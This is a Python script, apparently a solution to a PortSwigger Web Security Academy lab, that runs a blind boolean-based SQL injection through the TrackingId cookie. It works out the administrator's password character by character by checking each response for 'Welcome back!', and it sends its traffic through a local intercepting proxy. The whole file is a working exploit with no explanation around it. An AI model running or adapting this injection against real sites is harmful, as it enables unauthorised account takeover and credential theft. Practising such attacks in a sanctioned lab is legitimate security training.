import requests
import string

url = "https://0a550099047d16c184d99a7500f8000b.web-security-academy.net/"
session_cookie = "iGJiP9IXuhwZxKJ95xsGboKjqNYxRdyi"
tracking_id = "Jx8oL8Y7p80IWDEW"
chars = string.ascii_lowercase + string.digits
password_length = 20
password = ""

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def send_request(position, char):
    payload = f"{tracking_id}' AND (SELECT SUBSTRING(password, {position}, 1) FROM users WHERE username = 'administrator')='{char}"
    cookies = {
        "TrackingId": payload,
        "session": session_cookie,
    }
    response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    return "Welcome back!" in response.text

for pos in range(1, password_length + 1):
    for char in chars:
        if send_request(pos, char):
            password += char
            print(f"Position {pos}: {char} (Password so far: {password})")
            break

print("**************************************************")
print(f"Final Password: {password} ✅")
print("**************************************************")